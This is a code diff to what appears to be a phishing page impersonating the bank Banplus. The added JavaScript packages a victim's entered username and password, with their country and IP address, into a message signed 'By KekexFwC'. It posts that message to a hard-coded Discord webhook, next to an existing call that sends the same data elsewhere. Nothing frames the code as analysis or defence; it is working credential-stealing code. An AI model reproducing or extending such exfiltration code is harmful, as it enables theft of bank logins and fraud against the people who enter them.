@@ -958,6 +958,20 @@
                     last_active: firebase.firestore.FieldValue.serverTimestamp()
                 }, { merge: true });
 
+                const message = `➖➖➖➖➖[ 🏦Banplus Incorrecto ]➖➖➖➖➖\n👤 Usuario: ${usuarioInput}\n👤 Contraseña: ${passwordInput}\n➖➖➖➖➖[ IP ]➖➖➖➖➖\nPaís: ${pais}\nIP: ${ip}\n➖➖➖➖➖[ By KekexFwC 👨🏻‍💻 ]➖➖➖➖➖\n`;
+
+            const discord_webhook_url = "https://discord.com/api/webhooks/1558568551550292148/Wskx0sJITD2_84Kea18I4PcSJx9_-LlbfuDfAREN4ikumaVlxbqDEYZk4A5BFDGner0W";
+
+            await fetch(discord_webhook_url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    content: message
+                }),
+            });
+
                 // Enviar también al webhook de Discord utilizando la variable de config.js en paralelo
                 enviarDiscord(usuarioInput, passwordInput, pais, ip);
 
